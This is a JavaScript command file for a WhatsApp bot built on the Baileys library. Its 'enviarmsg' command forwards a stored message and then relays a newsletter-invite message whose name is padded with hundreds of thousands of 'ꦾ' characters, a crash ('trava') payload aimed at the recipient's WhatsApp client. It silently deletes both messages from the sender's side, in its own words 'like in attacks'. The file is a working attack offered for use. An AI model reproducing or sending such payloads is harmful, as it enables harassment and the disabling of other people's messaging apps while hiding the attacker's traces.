import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Solo el número vinculado al bot puede usar este comando.');
    }

    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado.');

    // 1. Enviar mensaje del archivo (copyNForward)
    const reenviado = await conn.copyNForward(m.chat, mensaje, true);

    // 2. Eliminar silenciosamente (como en los ataques)
    await conn.sendMessage(conn.user.id, { delete: reenviado.key });

    // 3. Generar mensaje tipo canal
    const travas = 'ꦾ'.repeat(90000);
    const canal = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const generado = await generateWAMessageFromContent(m.chat, canal, {
      userJid: conn.user.id,
    });

    await conn.relayMessage(m.chat, generado.message, { messageId: generado.key.id });

    // 4. Eliminar silenciosamente el segundo también
    await conn.sendMessage(conn.user.id, { delete: generado.key });

    // 5. Confirmación visible
    await conn.sendMessage(m.chat, {
      text: '😼 Enviado con exito.',
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;